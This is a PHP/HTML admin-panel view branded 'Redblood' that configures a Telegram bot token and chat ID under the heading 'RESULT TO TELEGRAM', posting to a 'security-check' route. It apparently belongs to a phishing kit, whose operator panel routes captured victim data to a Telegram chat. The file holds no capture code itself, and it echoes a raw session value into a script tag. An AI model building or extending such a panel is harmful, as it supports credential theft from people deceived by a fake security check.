<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Admin Panel - Redblood</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/img/favicon.ico" rel="icon">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@500;700&display=swap" rel="stylesheet"> 
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/css/bootstrap.min.css" rel="stylesheet">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/css/fxc.css" rel="stylesheet">
</head>

<body>
    <div class="container-fluid position-relative d-flex p-0">
        <!-- Spinner Start -->
        <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>

        <?php include "sidebar.php"; ?>
        <div class="content">
            <?php include "navbar.php"; ?>
            <div class="container-fluid pt-4 px-4">
                <div class="mb-3 text-left">
                    <strong class="text-warning"><i class="fab fa-telegram text-info m-2"></i> RESULT TO TELEGRAM</strong>
                </div>  
            </div>
            <div class="col-md-6 col-md-6 m-3">
                <form action="<?= base_url() ?>security-check/panel/update" method="post">
                    <div class="text-center mb-3">
                        <input style="background-color:rgb(185, 185, 185); color:black;" class="form-control"  type="text" name="token" placeholder="Token" value="<?php echo telex('token'); ?>">
                    </div>
                   <div class="text-center">
                        <input style="background-color:rgb(185, 185, 185); color:black;" class="form-control" type="text"  name="id" placeholder="Chat Id" value="<?php echo telex('idtelegram');?>">
                    </div>
                    <div class="mt-3">
                        <button class="btn btn-primary" type="submit" name="uptel"><i class="fa fa-arrow-up"></i> UPDATE</button>
                    </div>
                </form>
            </div>          
            <div class="container-fluid pt-4 px-4">
                <div class="bg-secondary rounded-top p-4">
                    <div class="row">
                        <div class="col-12 col-sm-6 text-center text-sm-start">
                            &copy; <a href="#">2024 Redblood</a> All Right Reserved. 
                        </div>
                        <div class="col-12 col-sm-6 text-center text-sm-end">
                            Made with <i class="fa fa-heart text-primary"></i> by <a href="#">Redblood</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/chart/chart.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/easing/easing.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/waypoints/waypoints.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/js/moment.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>

    <script src="<?= base_url() ?>REDBLOOD/Assets/js/core/jquery.3.2.1.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-ui-1.12.1.custom/jquery-ui.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/core/popper.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/core/bootstrap.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/chartist/chartist.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/chartist/plugin/chartist-plugin-tooltip.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/bootstrap-toggle/bootstrap-toggle.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-mapael/jquery.mapael.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-mapael/maps/world_countries.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/chart-circle/circles.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-scrollbar/jquery.scrollbar.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/ready.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/demo.js"></script>
    
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/js/main.js"></script>
</body>

</html>
<?php if (@$_SESSION['sukses']) { ?>
    <script>
        <?php echo $_SESSION['sukses']; ?>
    </script>
<?php unset($_SESSION['sukses']);
} ?>

</html>